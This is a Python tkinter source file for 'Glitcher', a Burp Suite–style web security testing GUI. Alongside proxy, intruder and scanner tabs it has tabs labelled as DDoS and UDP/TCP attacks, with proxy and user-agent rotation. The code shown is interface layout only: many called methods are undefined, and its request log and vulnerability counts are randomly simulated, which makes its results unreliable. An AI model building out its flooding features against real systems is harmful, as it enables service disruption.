# glitcher_gui.py - Professional Web Security Testing Tool GUI
import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, filedialog
import threading
import time
import json
import requests
from urllib.parse import urlparse, urljoin
import base64
import hashlib
import random
import re
from bs4 import BeautifulSoup
import urllib3
from PIL import Image, ImageTk
import math
try:
    import cv2
    CV2_AVAILABLE = True
except ImportError:
    CV2_AVAILABLE = False
    print("Warning: OpenCV not available. Video loading screen will not work.")

# Disable SSL warnings for testing
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)



# Read user agents from file
try:
    with open('user-agents.txt', 'r', encoding='utf-8') as f:
        USER_AGENTS = [line.strip() for line in f if line.strip()]
except FileNotFoundError:
    USER_AGENTS = ["Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"]

CURRENT_USER_AGENT = random.choice(USER_AGENTS) if USER_AGENTS else "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"

class GlitcherGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Glitcher - Professional Web Security Testing Platform")
        self.root.geometry("1400x800")
        
        # Animation variables
        self.animation_frame = 0
        self.is_animating = False
        self.animation_id = None
        
        # Data storage
        self.requests = []
        self.vulnerabilities = []
        self.targets = []
        self.site_urls = {}  # Store URLs for each site
        self.request_counter = 0
        self.vuln_counter = 0
        self.proxies = []  # Initialize proxies list
        
        # Initialize user agent
        self.current_user_agent = random.choice(USER_AGENTS) if USER_AGENTS else "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        
        # Set window title with user agent
        self.root.title(f"Glitcher - Professional Web Security Testing Platform - User-Agent: {self.current_user_agent[:30]}...")
        
        # Create animated loading screen
        self.create_loading_screen()
        
        # Loading screen is handled by create_loading_screen which will automatically proceed to main UI
    
    def create_loading_screen(self):
        # Create loading screen
        self.loading_frame = tk.Frame(self.root, bg='black')
        self.loading_frame.place(relx=0, rely=0, relwidth=1, relheight=1)
        
        # Create a label for video display
        self.video_label = tk.Label(self.loading_frame, bg='black')
        self.video_label.pack(expand=True)
        
        # Loading status
        self.loading_status = tk.Label(self.loading_frame, text="Loading...", font=("Arial", 12), fg="white", bg="black")
        self.loading_status.pack(pady=10)
        
        # Try to play video if OpenCV is available
        if CV2_AVAILABLE:
            self.play_loading_video()
        else:
            # Fallback to text if OpenCV is not available
            self.video_label.config(text="GLITCHER", font=("Courier", 60, "bold"), fg="#00ff00")
            self.root.after(2000, self.setup_ui_with_animation)
    
    def play_loading_video(self):
        # Initialize video capture
        self.video_capture = cv2.VideoCapture('templates/loading.mp4')
        
        if not self.video_capture.isOpened():
            # If video file doesn't exist, fallback to text
            self.video_label.config(text="GLITCHER", font=("Courier", 60, "bold"), fg="#00ff00")
            self.root.after(2000, self.setup_ui_with_animation)
            return
        
        # Get video properties
        self.fps = self.video_capture.get(cv2.CAP_PROP_FPS)
        self.delay = int(1000 / self.fps)  # Delay in milliseconds
        
        # Start playing video
        self.play_next_frame()
    
    def play_next_frame(self):
        ret, frame = self.video_capture.read()
        
        if ret:
            # Convert frame to RGB
            frame_rgb = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
            
            # Get frame dimensions
            height, width, channels = frame_rgb.shape
            
            # Calculate aspect ratio and resize to fit window while maintaining ratio
            # Get current window size, with fallback values
            current_width = self.root.winfo_width()
            current_height = self.root.winfo_height()
            
            # If window size is not available or too small, use default values
            if current_width <= 1:
                current_width = 800
            if current_height <= 1:
                current_height = 600
            
            # Calculate scale to fit video within window while maintaining aspect ratio
            width_ratio = current_width / width
            height_ratio = current_height / height
            scale = min(width_ratio, height_ratio) * 0.9  # 0.9 to leave some padding
            
            # Calculate new dimensions
            new_width = max(1, int(width * scale))
            new_height = max(1, int(height * scale))
            
            # Resize frame
            frame_resized = cv2.resize(frame_rgb, (new_width, new_height))
            
            # Convert to PhotoImage
            img = Image.fromarray(frame_resized)
            photo = ImageTk.PhotoImage(image=img)
            
            # Update label with new frame
            self.video_label.config(image=photo)
            self.video_label.image = photo  # Keep a reference
            
            # Schedule next frame
            self.root.after(self.delay, self.play_next_frame)
        else:
            # Video finished, release resources and proceed to main UI
            self.video_capture.release()
            self.setup_ui_with_animation()
    
    def setup_ui_with_animation(self):
        # If video capture exists, release it
        if hasattr(self, 'video_capture') and self.video_capture:
            self.video_capture.release()
        
        # Remove loading screen if it still exists
        if hasattr(self, 'loading_frame') and self.loading_frame.winfo_exists():
            self.loading_frame.destroy()
        
        # Create user agent display at top
        self.create_user_agent_display()
        
        self.setup_ui()
        self.start_simulation()
    

    

    

        
    def setup_ui(self):
        # Create main frame
        main_frame = ttk.Frame(self.root)
        main_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Create notebook for tabs
        self.notebook = ttk.Notebook(main_frame)
        self.notebook.pack(fill=tk.BOTH, expand=True)
        
        # Dashboard tab
        self.dashboard_frame = ttk.Frame(self.notebook)
        self.notebook.add(self.dashboard_frame, text="Dashboard")
        self.create_dashboard_ui()
        
        # Target tab (enhanced)
        self.target_frame = ttk.Frame(self.notebook)
        self.notebook.add(self.target_frame, text="Target")
        self.create_target_ui()
        
        # Site Package tab (new)
        self.site_package_frame = ttk.Frame(self.notebook)
        self.notebook.add(self.site_package_frame, text="Site Package")
        self.create_site_package_ui()
        
        # Proxy tab
        self.proxy_frame = ttk.Frame(self.notebook)
        self.notebook.add(self.proxy_frame, text="Proxy")
        self.create_proxy_ui()
        
        # Intruder tab
        self.intruder_frame = ttk.Frame(self.notebook)
        self.notebook.add(self.intruder_frame, text="Intruder")
        self.create_intruder_ui()
        
        # Sequencer tab
        self.sequencer_frame = ttk.Frame(self.notebook)
        self.notebook.add(self.sequencer_frame, text="Sequencer")
        self.create_sequencer_ui()
        
        # Comparer tab
        self.comparer_frame = ttk.Frame(self.notebook)
        self.notebook.add(self.comparer_frame, text="Comparer")
        self.create_comparer_ui()
        
        # Scanner tab
        self.scanner_frame = ttk.Frame(self.notebook)
        self.notebook.add(self.scanner_frame, text="Scanner")
        self.create_scanner_ui()
        
        # Extender tab
        self.extender_frame = ttk.Frame(self.notebook)
        self.notebook.add(self.extender_frame, text="Extender")
        self.create_extender_ui()
        
        # UA-Gen tab
        self.ua_gen_frame = ttk.Frame(self.notebook)
        self.notebook.add(self.ua_gen_frame, text="UA-Gen")
        self.create_ua_gen_ui()
        
        # DDoS tab
        self.ddos_frame = ttk.Frame(self.notebook)
        self.notebook.add(self.ddos_frame, text="D-Attack")
        self.create_ddos_ui()
        
        # UDP/TCP attack tab
        self.udp_tcp_frame = ttk.Frame(self.notebook)
        self.notebook.add(self.udp_tcp_frame, text="UDP/TCP Attack")
        self.create_udp_tcp_ui()
        
        # Proxy Management tab
        self.proxy_management_frame = ttk.Frame(self.notebook)
        self.notebook.add(self.proxy_management_frame, text="Proxy Management")
        self.create_proxy_management_ui()
        
        # Vulnerability Scanner tab
        self.vulnerability_scanner_frame = ttk.Frame(self.notebook)
        self.notebook.add(self.vulnerability_scanner_frame, text="Vulnerability Scanner")
        self.create_vulnerability_scanner_ui()
        
        # Traff tab
        self.traff_frame = ttk.Frame(self.notebook)
        self.notebook.add(self.traff_frame, text="Traff")
        self.create_traff_ui()
        
        # Network Teals tab
        self.network_teals_frame = ttk.Frame(self.notebook)
        self.notebook.add(self.network_teals_frame, text="Network Teals")
        self.create_network_teals_ui()
        
        # Burp Suite tab
        self.burp_suite_frame = ttk.Frame(self.notebook)
        self.notebook.add(self.burp_suite_frame, text="Glitch-Burp-V2")
        self.create_burp_suite_ui()
        
        # Update proxy lists in attack tabs after loading proxies
        self.root.after(100, self.update_ddos_proxy_list)
        self.root.after(100, self.update_udp_tcp_proxy_list)
        
    def create_dashboard_ui(self):
        # Stats frame
        stats_frame = ttk.LabelFrame(self.dashboard_frame, text="Statistics", padding=10)
        stats_frame.pack(fill=tk.X, padx=5, pady=5)
        
        # Create stat labels
        self.request_count_label = ttk.Label(stats_frame, text="Requests Intercepted: 0", font=("Arial", 12))
        self.request_count_label.grid(row=0, column=0, padx=10, pady=5, sticky=tk.W)
        
        self.vuln_count_label = ttk.Label(stats_frame, text="Vulnerabilities Found: 0", font=("Arial", 12))
        self.vuln_count_label.grid(row=0, column=1, padx=10, pady=5, sticky=tk.W)
        
        self.target_count_label = ttk.Label(stats_frame, text="Active Targets: 0", font=("Arial", 12))
        self.target_count_label.grid(row=0, column=2, padx=10, pady=5, sticky=tk.W)
        
        self.scan_progress_label = ttk.Label(stats_frame, text="Scan Progress: 0%", font=("Arial", 12))
        self.scan_progress_label.grid(row=0, column=3, padx=10, pady=5, sticky=tk.W)
        
        # Activity log
        activity_frame = ttk.LabelFrame(self.dashboard_frame, text="Recent Activity", padding=10)
        activity_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        self.activity_log = scrolledtext.ScrolledText(activity_frame, height=20, state=tk.DISABLED)
        self.activity_log.pack(fill=tk.BOTH, expand=True)
        
        # Add sample activity
        self.log_activity("Glitcher started successfully")
        self.log_activity("Ready for security testing")
        
    def create_user_agent_display(self):
        # Create a frame at the top of the main window to show the current User-Agent
        ua_frame = ttk.Frame(self.root)
        ua_frame.pack(fill=tk.X, padx=5, pady=5)
        
        ttk.Label(ua_frame, text="User-Agent:", font=("Arial", 10, "bold")).pack(side=tk.LEFT, padx=(0, 10))
        
        self.ua_label = ttk.Label(ua_frame, text=self.current_user_agent, font=("Arial", 10), foreground="blue")
        self.ua_label.pack(side=tk.LEFT, padx=(0, 20))
        
        # Add a button to change the User-Agent
        ttk.Button(ua_frame, text="Change User-Agent", command=self.change_user_agent).pack(side=tk.RIGHT)
        
    def change_user_agent(self):
        # Change to a new random User-Agent
        self.current_user_agent = random.choice(USER_AGENTS) if USER_AGENTS else "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        self.ua_label.config(text=self.current_user_agent)
        self.root.title(f"Glitcher - Professional Web Security Testing Platform - User-Agent: {self.current_user_agent[:30]}...")
        self.log_activity(f"User-Agent changed to: {self.current_user_agent[:50]}...")
        
    def create_target_ui(self):
        # Controls
        controls_frame = ttk.Frame(self.target_frame)
        controls_frame.pack(fill=tk.X, padx=5, pady=5)
        
        ttk.Label(controls_frame, text="Target URL:").pack(side=tk.LEFT, padx=5)
        self.target_url_entry = ttk.Entry(controls_frame, width=50)
        self.target_url_entry.pack(side=tk.LEFT, padx=5, fill=tk.X, expand=True)
        
        add_btn = ttk.Button(controls_frame, text="Add Target", command=self.add_target)
        add_btn.pack(side=tk.LEFT, padx=5)
        
        crawl_btn = ttk.Button(controls_frame, text="Crawl Site", command=self.crawl_site)
        crawl_btn.pack(side=tk.LEFT, padx=5)
        
        # Site map
        site_map_frame = ttk.LabelFrame(self.target_frame, text="Site Map", padding=5)
        site_map_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        self.site_map_tree = ttk.Treeview(site_map_frame, columns=('URL', 'Status'), show='headings')
        self.site_map_tree.heading('URL', text='URL')
        self.site_map_tree.heading('Status', text='Status')
        self.site_map_tree.column('URL', width=400)
        self.site_map_tree.column('Status', width=100)
        
        # Scrollbars
        v_scrollbar = ttk.Scrollbar(site_map_frame, orient=tk.VERTICAL, command=self.site_map_tree.yview)
        h_scrollbar = ttk.Scrollbar(site_map_frame, orient=tk.HORIZONTAL, command=self.site_map_tree.xview)
        self.site_map_tree.configure(yscrollcommand=v_scrollbar.set, xscrollcommand=h_scrollbar.set)
        
        # Pack elements
        self.site_map_tree.grid(row=0, column=0, sticky='nsew')
        v_scrollbar.grid(row=0, column=1, sticky='ns')
        h_scrollbar.grid(row=1, column=0, sticky='ew')
        
        site_map_frame.grid_rowconfigure(0, weight=1)
        site_map_frame.grid_columnconfigure(0, weight=1)
        
    def create_site_package_ui(self):
        # Main frame for site package
        main_frame = ttk.Frame(self.site_package_frame)
        main_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Left frame for sites and URLs
        left_frame = ttk.LabelFrame(main_frame, text="Sites & URLs", padding=5)
        left_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(0, 5))
        
        # Sites treeview
        sites_frame = ttk.Frame(left_frame)
        sites_frame.pack(fill=tk.BOTH, expand=True)
        
        self.sites_tree = ttk.Treeview(sites_frame, columns=('Site',), show='tree headings')
        self.sites_tree.heading('#0', text='Sites')
        self.sites_tree.column('#0', width=200)
        
        # URLs treeview (nested under sites)
        urls_frame = ttk.Frame(left_frame)
        urls_frame.pack(fill=tk.BOTH, expand=True, pady=(5, 0))
        
        self.urls_tree = ttk.Treeview(urls_frame, columns=('URL', 'Type'), show='headings')
        self.urls_tree.heading('URL', text='URL')
        self.urls_tree.heading('Type', text='Type')
        self.urls_tree.column('URL', width=300)
        self.urls_tree.column('Type', width=100)
        
        # Add button to send selected URL to vulnerability scanner
        button_frame = ttk.Frame(left_frame)
        button_frame.pack(fill=tk.X, pady=5)
        
        ttk.Button(button_frame, text="Scan Selected URL", command=self.scan_selected_url).pack(side=tk.LEFT, padx=5)
        
        # Bind selection event
        self.sites_tree.bind('<<TreeviewSelect>>', self.on_site_select)
        
        # Scrollbars
        sites_v_scrollbar = ttk.Scrollbar(sites_frame, orient=tk.VERTICAL, command=self.sites_tree.yview)
        sites_h_scrollbar = ttk.Scrollbar(sites_frame, orient=tk.HORIZONTAL, command=self.sites_tree.xview)
        self.sites_tree.configure(yscrollcommand=sites_v_scrollbar.set, xscrollcommand=sites_h_scrollbar.set)
        
        urls_v_scrollbar = ttk.Scrollbar(urls_frame, orient=tk.VERTICAL, command=self.urls_tree.yview)
        urls_h_scrollbar = ttk.Scrollbar(urls_frame, orient=tk.HORIZONTAL, command=self.urls_tree.xview)
        self.urls_tree.configure(yscrollcommand=urls_v_scrollbar.set, xscrollcommand=urls_h_scrollbar.set)
        
        # Pack sites elements
        self.sites_tree.grid(row=0, column=0, sticky='nsew')
        sites_v_scrollbar.grid(row=0, column=1, sticky='ns')
        sites_h_scrollbar.grid(row=1, column=0, sticky='ew')
        
        sites_frame.grid_rowconfigure(0, weight=1)
        sites_frame.grid_columnconfigure(0, weight=1)
        
        # Pack urls elements
        self.urls_tree.grid(row=0, column=0, sticky='nsew')
        urls_v_scrollbar.grid(row=0, column=1, sticky='ns')
        urls_h_scrollbar.grid(row=1, column=0, sticky='ew')
        
        urls_frame.grid_rowconfigure(0, weight=1)
        urls_frame.grid_columnconfigure(0, weight=1)
        
        # Right frame for vulnerabilities and analysis
        right_frame = ttk.LabelFrame(main_frame, text="Vulnerability Analysis", padding=5)
        right_frame.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=(5, 0))
        
        # Notebook for different analysis types
        self.analysis_notebook = ttk.Notebook(right_frame)
        self.analysis_notebook.pack(fill=tk.BOTH, expand=True)
        
        # SQL Injection tab
        self.sql_frame = ttk.Frame(self.analysis_notebook)
        self.analysis_notebook.add(self.sql_frame, text="SQL Injection")
        
        self.sql_results = scrolledtext.ScrolledText(self.sql_frame)
        self.sql_results.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # XSS tab
        self.xss_frame = ttk.Frame(self.analysis_notebook)
        self.analysis_notebook.add(self.xss_frame, text="XSS")
        
        self.xss_results = scrolledtext.ScrolledText(self.xss_frame)
        self.xss_results.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Comments tab
        self.comments_frame = ttk.Frame(self.analysis_notebook)
        self.analysis_notebook.add(self.comments_frame, text="Comments")
        
        self.comments_results = scrolledtext.ScrolledText(self.comments_frame)
        self.comments_results.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Hidden URLs tab
        self.hidden_frame = ttk.Frame(self.analysis_notebook)
        self.analysis_notebook.add(self.hidden_frame, text="Hidden URLs")
        
        self.hidden_results = scrolledtext.ScrolledText(self.hidden_frame)
        self.hidden_results.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Bind URL selection to vulnerability analysis
        self.urls_tree.bind('<<TreeviewSelect>>', self.analyze_url)
        
    def create_proxy_ui(self):
        # Controls frame
        controls_frame = ttk.Frame(self.proxy_frame)
        controls_frame.pack(fill=tk.X, padx=5, pady=5)
        
        self.proxy_on_button = ttk.Button(controls_frame, text="Intercept: OFF", command=self.toggle_proxy)
        self.proxy_on_button.pack(side=tk.LEFT, padx=5)
        
        clear_btn = ttk.Button(controls_frame, text="Clear History", command=self.clear_proxy_history)
        clear_btn.pack(side=tk.LEFT, padx=5)
        
        # History treeview
        history_frame = ttk.Frame(self.proxy_frame)
        history_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        columns = ('#', 'Method', 'URL', 'Status', 'Length', 'Time', 'Actions')
        self.proxy_tree = ttk.Treeview(history_frame, columns=columns, show='headings', height=20)
        
        # Define headings
        for col in columns:
            self.proxy_tree.heading(col, text=col)
            self.proxy_tree.column(col, width=100)
        
        # Scrollbars
        v_scrollbar = ttk.Scrollbar(history_frame, orient=tk.VERTICAL, command=self.proxy_tree.yview)
        h_scrollbar = ttk.Scrollbar(history_frame, orient=tk.HORIZONTAL, command=self.proxy_tree.xview)
        self.proxy_tree.configure(yscrollcommand=v_scrollbar.set, xscrollcommand=h_scrollbar.set)
        
        # Pack elements
        self.proxy_tree.grid(row=0, column=0, sticky='nsew')
        v_scrollbar.grid(row=0, column=1, sticky='ns')
        h_scrollbar.grid(row=1, column=0, sticky='ew')
        
        history_frame.grid_rowconfigure(0, weight=1)
        history_frame.grid_columnconfigure(0, weight=1)
        
    def create_intruder_ui(self):
        # Controls frame
        controls_frame = ttk.Frame(self.intruder_frame)
        controls_frame.pack(fill=tk.X, padx=5, pady=5)
        
        ttk.Label(controls_frame, text="Attack Type:").pack(side=tk.LEFT, padx=5)
        self.attack_type_var = tk.StringVar(value="Sniper")
        attack_type_combo = ttk.Combobox(controls_frame, textvariable=self.attack_type_var, 
                                        values=["Sniper", "Battering Ram", "Pitchfork", "Cluster Bomb"])
        attack_type_combo.pack(side=tk.LEFT, padx=5)
        
        start_btn = ttk.Button(controls_frame, text="Start Attack", command=self.start_intruder_attack)
        start_btn.pack(side=tk.LEFT, padx=5)
        
        clear_btn = ttk.Button(controls_frame, text="Clear", command=self.clear_intruder)
        clear_btn.pack(side=tk.LEFT, padx=5)
        
        # Request editor
        request_frame = ttk.LabelFrame(self.intruder_frame, text="Request", padding=5)
        request_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        self.intruder_request_text = scrolledtext.ScrolledText(request_frame, height=10)
        self.intruder_request_text.pack(fill=tk.BOTH, expand=True)
        
        # Payloads
        payloads_frame = ttk.LabelFrame(self.intruder_frame, text="Payloads", padding=5)
        payloads_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        self.payloads_text = scrolledtext.ScrolledText(payloads_frame, height=8)
        self.payloads_text.pack(fill=tk.BOTH, expand=True)
        
        # Results
        results_frame = ttk.LabelFrame(self.intruder_frame, text="Results", padding=5)
        results_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        self.intruder_results_text = scrolledtext.ScrolledText(results_frame, height=10)
        self.intruder_results_text.pack(fill=tk.BOTH, expand=True)
        
    def create_sequencer_ui(self):
        sequencer_frame = ttk.LabelFrame(self.sequencer_frame, text="Sequencer - Randomness Analysis", padding=10)
        sequencer_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        ttk.Label(sequencer_frame, text="Token Analysis Tool", font=("Arial", 14, "bold")).pack(pady=10)
        ttk.Label(sequencer_frame, text="Capture tokens to analyze their randomness and predictability").pack(pady=5)
        
        # Controls
        controls_frame = ttk.Frame(sequencer_frame)
        controls_frame.pack(fill=tk.X, pady=10)
        
        ttk.Button(controls_frame, text="Start Capture").pack(side=tk.LEFT, padx=5)
        ttk.Button(controls_frame, text="Stop Capture").pack(side=tk.LEFT, padx=5)
        ttk.Button(controls_frame, text="Analyze Tokens").pack(side=tk.LEFT, padx=5)
        
        # Results
        results_frame = ttk.Frame(sequencer_frame)
        results_frame.pack(fill=tk.BOTH, expand=True, pady=10)
        
        self.sequencer_results = scrolledtext.ScrolledText(results_frame)
        self.sequencer_results.pack(fill=tk.BOTH, expand=True)
        
    def create_comparer_ui(self):
        comparer_frame = ttk.LabelFrame(self.comparer_frame, text="Comparer - Content Comparison", padding=10)
        comparer_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Input 1
        ttk.Label(comparer_frame, text="Input 1:", font=("Arial", 10, "bold")).grid(row=0, column=0, sticky=tk.W, pady=5)
        self.comparer_input1 = scrolledtext.ScrolledText(comparer_frame, height=10)
        self.comparer_input1.grid(row=1, column=0, sticky="nsew", padx=(0, 5))
        
        # Input 2
        ttk.Label(comparer_frame, text="Input 2:", font=("Arial", 10, "bold")).grid(row=0, column=1, sticky=tk.W, pady=5)
        self.comparer_input2 = scrolledtext.ScrolledText(comparer_frame, height=10)
        self.comparer_input2.grid(row=1, column=1, sticky="nsew", padx=(5, 0))
        
        # Compare button
        ttk.Button(comparer_frame, text="Compare", command=self.compare_content).grid(row=2, column=0, columnspan=2, pady=10)
        
        # Results
        ttk.Label(comparer_frame, text="Comparison Results:", font=("Arial", 10, "bold")).grid(row=3, column=0, columnspan=2, sticky=tk.W, pady=(10, 5))
        self.comparer_results = scrolledtext.ScrolledText(comparer_frame, height=8)
        self.comparer_results.grid(row=4, column=0, columnspan=2, sticky="nsew", pady=5)
        
        # Configure grid weights
        comparer_frame.grid_rowconfigure(1, weight=1)
        comparer_frame.grid_rowconfigure(4, weight=1)
        comparer_frame.grid_columnconfigure(0, weight=1)
        comparer_frame.grid_columnconfigure(1, weight=1)
        
    def create_scanner_ui(self):
        scanner_frame = ttk.LabelFrame(self.scanner_frame, text="Scanner - Automated Vulnerability Detection", padding=10)
        scanner_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Controls
        controls_frame = ttk.Frame(scanner_frame)
        controls_frame.pack(fill=tk.X, pady=5)
        
        ttk.Label(controls_frame, text="Target:").pack(side=tk.LEFT)
        self.scanner_target = ttk.Entry(controls_frame, width=40)
        self.scanner_target.pack(side=tk.LEFT, padx=5, fill=tk.X, expand=True)
        
        ttk.Button(controls_frame, text="Start Scan", command=self.start_scan).pack(side=tk.LEFT, padx=5)
        ttk.Button(controls_frame, text="Stop Scan").pack(side=tk.LEFT, padx=5)
        
        # Progress
        self.scan_progress = ttk.Progressbar(scanner_frame, mode='determinate')
        self.scan_progress.pack(fill=tk.X, pady=10)
        
        # Results
        results_frame = ttk.LabelFrame(scanner_frame, text="Scan Results", padding=5)
        results_frame.pack(fill=tk.BOTH, expand=True, pady=10)
        
        self.scanner_results = scrolledtext.ScrolledText(results_frame)
        self.scanner_results.pack(fill=tk.BOTH, expand=True)
        
    def create_ua_gen_ui(self):
        # Main frame for UA-Gen
        ua_gen_main_frame = ttk.LabelFrame(self.ua_gen_frame, text="User-Agent Generator", padding=10)
        ua_gen_main_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Questions frame
        questions_frame = ttk.LabelFrame(ua_gen_main_frame, text="Select Options", padding=10)
        questions_frame.pack(fill=tk.X, padx=5, pady=5)
        
        # Operating System selection
        ttk.Label(questions_frame, text="Operating System:", font=("Arial", 10, "bold")).grid(row=0, column=0, sticky=tk.W, padx=(0, 10), pady=5)
        self.os_var = tk.StringVar(value="Any")
        os_options = ["Any", "Windows", "Mac", "Linux", "Android", "iOS"]
        self.os_combo = ttk.Combobox(questions_frame, textvariable=self.os_var, values=os_options, state="readonly")
        self.os_combo.grid(row=0, column=1, sticky=tk.W, padx=(0, 20), pady=5)
        
        # Device selection
        ttk.Label(questions_frame, text="Device Type:", font=("Arial", 10, "bold")).grid(row=1, column=0, sticky=tk.W, padx=(0, 10), pady=5)
        self.device_var = tk.StringVar(value="Any")
        device_options = ["Any", "Desktop", "Mobile", "Tablet"]
        self.device_combo = ttk.Combobox(questions_frame, textvariable=self.device_var, values=device_options, state="readonly")
        self.device_combo.grid(row=1, column=1, sticky=tk.W, padx=(0, 20), pady=5)
        
        # Browser selection
        ttk.Label(questions_frame, text="Browser:", font=("Arial", 10, "bold")).grid(row=2, column=0, sticky=tk.W, padx=(0, 10), pady=5)
        self.browser_var = tk.StringVar(value="Any")
        browser_options = ["Any", "Chrome", "Firefox", "Safari", "Edge", "Opera"]
        self.browser_combo = ttk.Combobox(questions_frame, textvariable=self.browser_var, values=browser_options, state="readonly")
        self.browser_combo.grid(row=2, column=1, sticky=tk.W, padx=(0, 20), pady=5)
        
        # Number of User-Agents to generate
        ttk.Label(questions_frame, text="How many to generate:", font=("Arial", 10, "bold")).grid(row=3, column=0, sticky=tk.W, padx=(0, 10), pady=5)
        self.count_var = tk.StringVar(value="5")
        self.count_spinbox = tk.Spinbox(questions_frame, from_=1, to=100, textvariable=self.count_var, width=10)
        self.count_spinbox.grid(row=3, column=1, sticky=tk.W, padx=(0, 20), pady=5)
        
        # Generate button
        self.generate_btn = ttk.Button(questions_frame, text="Generate User-Agents", command=self.generate_user_agents)
        self.generate_btn.grid(row=4, column=0, columnspan=2, pady=10)
        
        # Results frame
        results_frame = ttk.LabelFrame(ua_gen_main_frame, text="Generated User-Agents", padding=10)
        results_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Text area for generated User-Agents
        self.ua_results_text = scrolledtext.ScrolledText(results_frame, height=15)
        self.ua_results_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Add to file button
        button_frame = ttk.Frame(ua_gen_main_frame)
        button_frame.pack(fill=tk.X, padx=5, pady=5)
        
        self.add_to_file_btn = ttk.Button(button_frame, text="Add to user-agents.txt", command=self.add_to_user_agents_file, state=tk.DISABLED)
        self.add_to_file_btn.pack(side=tk.RIGHT, padx=5)
    
    def create_extender_ui(self):
        extender_frame = ttk.LabelFrame(self.extender_frame, text="Extender - BApp Store & Extensions", padding=10)
        extender_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        ttk.Label(extender_frame, text="Extension Management", font=("Arial", 14, "bold")).pack(pady=10)
        ttk.Label(extender_frame, text="Manage and install extensions for enhanced functionality").pack(pady=5)
        
        # Controls
        controls_frame = ttk.Frame(extender_frame)
        controls_frame.pack(fill=tk.X, pady=10)
        
        ttk.Button(controls_frame, text="Install Extension").pack(side=tk.LEFT, padx=5)
        ttk.Button(controls_frame, text="Remove Extension").pack(side=tk.LEFT, padx=5)
        ttk.Button(controls_frame, text="Reload Extensions").pack(side=tk.LEFT, padx=5)
        
        # Installed extensions list
        extensions_frame = ttk.LabelFrame(extender_frame, text="Installed Extensions", padding=5)
        extensions_frame.pack(fill=tk.BOTH, expand=True, pady=10)
        
        columns = ('Name', 'Version', 'Status', 'Actions')
        self.extensions_tree = ttk.Treeview(extensions_frame, columns=columns, show='headings')
        
        for col in columns:
            self.extensions_tree.heading(col, text=col)
            self.extensions_tree.column(col, width=150)
        
        # Add sample extensions
        extensions = [
            ("SQLi Scanner", "1.2.0", "Active"),
            ("XSS Detector", "1.0.5", "Active"),
            ("Auth Analyzer", "0.9.8", "Inactive"),
            ("API Inspector", "2.1.0", "Active")
        ]
        
        for ext in extensions:
            self.extensions_tree.insert('', tk.END, values=ext + ("Manage",))
        
        # Scrollbars
        v_scrollbar = ttk.Scrollbar(extensions_frame, orient=tk.VERTICAL, command=self.extensions_tree.yview)
        h_scrollbar = ttk.Scrollbar(extensions_frame, orient=tk.HORIZONTAL, command=self.extensions_tree.xview)
        self.extensions_tree.configure(yscrollcommand=v_scrollbar.set, xscrollcommand=h_scrollbar.set)
        
        # Pack elements
        self.extensions_tree.grid(row=0, column=0, sticky='nsew')
        v_scrollbar.grid(row=0, column=1, sticky='ns')
        h_scrollbar.grid(row=1, column=0, sticky='ew')
        
        extensions_frame.grid_rowconfigure(0, weight=1)
        extensions_frame.grid_columnconfigure(0, weight=1)
        
    def toggle_proxy(self):
        if self.proxy_on_button['text'] == "Intercept: OFF":
            self.proxy_on_button['text'] = "Intercept: ON"
            self.proxy_on_button.configure(style='Danger.TButton')
            self.log_activity("Proxy interception enabled")
        else:
            self.proxy_on_button['text'] = "Intercept: OFF"
            self.proxy_on_button.configure(style='TButton')
            self.log_activity("Proxy interception disabled")
    
    def clear_proxy_history(self):
        for item in self.proxy_tree.get_children():
            self.proxy_tree.delete(item)
        self.requests = []
        self.update_dashboard_stats()
        self.log_activity("Proxy history cleared")
    
    def simulate_request(self):
        methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH']
        domains = ['example.com', 'test.com', 'demo.org', 'sample.net', 'site.edu']
        paths = ['/login', '/api/users', '/admin', '/dashboard', '/profile', '/api/data', '/auth', '/upload']
        statuses = [200, 201, 400, 401, 403, 404, 500]
        
        method = random.choice(methods)
        domain = random.choice(domains)
        path = random.choice(paths)
        status = random.choice(statuses)
        length = random.randint(100, 5000)
        time_ms = round(random.random() * 1000, 2)
        
        request = {
            'id': self.request_counter + 1,
            'method': method,
            'url': f'https://{domain}{path}',
            'status': status,
            'length': length,
            'time': time_ms
        }
        
        self.requests.append(request)
        self.request_counter += 1
        
        # Add to treeview
        self.proxy_tree.insert('', tk.END, values=(
            request['id'],
            request['method'],
            request['url'],
            request['status'],
            request['length'],
            f"{request['time']}ms",
            "Actions"
        ))
        
        self.update_dashboard_stats()
        
        # Simulate potential vulnerabilities
        if method == 'POST' and 'login' in path:
            self.detect_vulnerability(request)
        
        return request
    
